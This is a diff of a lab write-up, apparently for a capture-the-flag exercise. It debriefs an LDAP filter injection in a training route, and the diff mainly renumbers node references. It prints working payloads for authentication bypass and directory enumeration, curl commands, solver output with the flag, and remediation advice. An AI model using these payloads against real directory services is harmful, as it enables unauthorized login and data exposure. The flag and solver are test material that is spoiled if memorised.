@@ -1,6 +1,6 @@
 # Zodiac Twelve Directory Breach, Debrief
 
-**Node:** `p4_3` &middot; **Flag:** `SEIYAKU{star_closes_the_filter}` &middot; **Route:** `GET/POST /p4/zodiac` &middot; **Sink:** `challenges/phase4.py`, real OpenLDAP (`ou=zodiac,dc=hunterassoc,dc=org`) via `core/db.py`'s `ldap_conn()` &middot; **Signal:** the matched entry/entries, fully revealed on success
+**Node:** `p4_5` &middot; **Flag:** `SEIYAKU{star_closes_the_filter}` &middot; **Route:** `GET/POST /p4/zodiac` &middot; **Sink:** `challenges/phase4.py`, real OpenLDAP (`ou=zodiac,dc=hunterassoc,dc=org`) via `core/db.py`'s `ldap_conn()` &middot; **Signal:** the matched entry/entries, fully revealed on success
 
 ## LDAP basics, briefly
 
@@ -33,7 +33,7 @@
 
 ## The bug, in one line
 
-Two routes' worth of logic in `challenges/phase4.py`'s p4_3 block build a
+Two routes' worth of logic in `challenges/phase4.py`'s p4_5 block build a
 real LDAP filter with plain Python f-strings, and never call
 `ldap.filter.escape_filter_chars()`, python-ldap's own RFC-4515
 escaping helper, on any piece of request-supplied text before it lands
@@ -45,7 +45,7 @@ gets to add, close, reopen, or wildcard a clause of their own.
 ## The vulnerable sinks
 
 ```python
-# challenges/phase4.py, p4_3, directory search (GET ?uid=...)
+# challenges/phase4.py, p4_5, directory search (GET ?uid=...)
 if search_uid:
     # VULN: `search_uid` is dropped straight into this filter via an
     # f-string, completely unescaped.
@@ -54,7 +54,7 @@ if search_uid:
 ```
 
 ```python
-# challenges/phase4.py, p4_3, sign-in (POST username/password)
+# challenges/phase4.py, p4_5, sign-in (POST username/password)
 if request.method == "POST":
     username, password = _zodiac_credentials()
     # VULN: `username` and `password` are dropped straight into this
@@ -86,7 +86,7 @@ only happen once the filter has already been widened past what a single
 uid could ever legitimately select.
 
 ```python
-# challenges/phase4.py, p4_3
+# challenges/phase4.py, p4_5
 search_dump_mode = len(entries) > 1
 if search_dump_mode:
     search_members = [_raw_member(dn, attrs) for dn, attrs in entries]
@@ -158,7 +158,7 @@ curl -s -X POST "$BASE/p4/zodiac" -H "Accept: application/json" \
 
 `success:true`, logged in as `uid=ox`, genuine real OpenLDAP natural
 search order decided *which* member came back first (this route never
-sorts or special-cases the result, same convention as p4_2's guardian
+sorts or special-cases the result, same convention as p4_1's guardian
 bypass); the point isn't *which* member you land on, it's that you land
 on a real one with no valid credential supplied at all. (A real
 attacker who wanted a *specific* seat could narrow the same trick,
@@ -196,7 +196,7 @@ Live proof against the real running stack (13 entries returned,
 `dump_mode:true`, `uid=chairman`'s `description` genuinely present in
 the response, full transcript trimmed to the chairman entry for
 readability, the untrimmed 13-entry response is what
-`solvers/p4_3.sh` actually asserts against):
+`solvers/p4_5.sh` actually asserts against):
 
 ```bash
 curl -s -G "$BASE/p4/zodiac" -H "Accept: application/json" --data-urlencode 'uid=*)(objectClass=*'
@@ -227,7 +227,7 @@ technique the login filter's `username` field above needs).
 
 ## The full solver, live
 
-`solvers/p4_3.sh` runs all four checks below against the real running
+`solvers/p4_5.sh` runs all four checks below against the real running
 stack, in order: (1) a genuine wrong-password login must fail, (2) a
 direct `uid=chairman` lookup must not leak `description`, (3) the
 auth-bypass payload, (4) the enumeration payload. This is the actual,
@@ -235,24 +235,24 @@ unedited output of a real run against this exact seed (`SEIYAKU_BASE`
 was the default `http://localhost:8000` for this run):
 
 ```
-[p4_3] target: http://localhost:8000/p4/zodiac
-[p4_3] step 1, legitimate login with a wrong/guessed plain-string password
+[p4_5] target: http://localhost:8000/p4/zodiac
+[p4_5] step 1, legitimate login with a wrong/guessed plain-string password
   POST username=chairman&password=totally-wrong-guess
   response: {"login":{"attempted":true,"error":null,"member":null,"submitted_username":"chairman","success":false},"search":{"count":null,"dump_mode":false,"error":null,"members":[],"uid":null}}
   ok: wrong plain-string password was correctly rejected
-[p4_3] step 2, normal, non-injected directory search for uid=chairman
+[p4_5] step 2, normal, non-injected directory search for uid=chairman
   GET /p4/zodiac?uid=chairman
   response: {"login":{"attempted":false,"error":null,"member":null,"submitted_username":null,"success":false},"search":{"count":1,"dump_mode":false,"error":null,"members":[{"cn":"Chairman","dn":"uid=chairman,ou=zodiac,dc=hunterassoc,dc=org","mail":"chairman@hunterassoc.org","title":"Chairman, Zodiac Committee","uid":"chairman"}],"uid":"chairman"}}
   ok: a direct, well-formed uid=chairman lookup does not leak description
-[p4_3] step 3, auth bypass: username=*)(uid=* & password=*
+[p4_5] step 3, auth bypass: username=*)(uid=* & password=*
   response: {"login":{"attempted":true,"error":null,"member":{"cn":"Ox","dn":"uid=ox,ou=zodiac,dc=hunterassoc,dc=org","mail":"ox@hunterassoc.org","title":"Zodiac Committee Member","uid":"ox"},"submitted_username":"*)(uid=*","success":true},"search":{"count":null,"dump_mode":false,"error":null,"members":[],"uid":null}}
   ok: filter-injection auth bypass logged in with no valid credential
-[p4_3] step 4, directory enumeration: uid=*)(objectClass=*
+[p4_5] step 4, directory enumeration: uid=*)(objectClass=*
   response: {"login":{"attempted":false,"error":null,"member":null,"submitted_username":null,"success":false},"search":{"count":13,"dump_mode":true,"error":null,"members":[{"cn":"Rat","description":null,...},{"cn":"Ox","description":null,...},{"cn":"Tiger","description":null,...},{"cn":"Rabbit","description":null,...},{"cn":"Dragon","description":null,...},{"cn":"Snake","description":null,...},{"cn":"Horse","description":null,...},{"cn":"Goat","description":null,...},{"cn":"Monkey","description":null,...},{"cn":"Rooster","description":null,...},{"cn":"Dog","description":null,...},{"cn":"Pig","description":null,...},{"cn":"Chairman","description":"SEIYAKU{star_closes_the_filter}","dn":"uid=chairman,ou=zodiac,dc=hunterassoc,dc=org","mail":"chairman@hunterassoc.org","title":"Chairman, Zodiac Committee","uid":"chairman"}],"uid":"*)(objectClass=*"}}
   ok: enumeration payload dumped the full roster, flag recovered: SEIYAKU{star_closes_the_filter}
-[p4_3] ok: wrong password rejected, direct chairman lookup safe, bypass +
-[p4_3]     enumeration both worked against the real seeded OpenLDAP directory
-[p4_3] PASS
+[p4_5] ok: wrong password rejected, direct chairman lookup safe, bypass +
+[p4_5]     enumeration both worked against the real seeded OpenLDAP directory
+[p4_5] PASS
 ```
 
 (This run followed a `docker compose down -v` + `up` immediately before
@@ -314,14 +314,14 @@ simply never the only question its own grammar could express.
   logic still can't read what the directory itself never grants that
   account.
 - **Never build a directory filter, or any structured query, by raw
-  string concatenation.** This is the same generalization p4_1's and
-  p4_2's remediations already reach for MongoDB: any interface that
+  string concatenation.** This is the same generalization p4_3's and
+  p4_1's remediations already reach for MongoDB: any interface that
   parses a string into a query (SQL, an LDAP filter, a regex, a shell
   command) has an injection surface the moment attacker-controlled text
   reaches it unescaped, regardless of which specific characters that
   particular grammar happens to treat as special.
 - **Authenticate via a real bind, not a search-and-compare on
-  `userPassword`.** This route's login (like p4_2's) checks credentials
+  `userPassword`.** This route's login (like p4_1's) checks credentials
   by searching for an entry whose `userPassword` matches a supplied
   value, convenient for a teaching lab, but a real system should
   attempt `simple_bind_s(dn, password)` as the candidate user's own DN
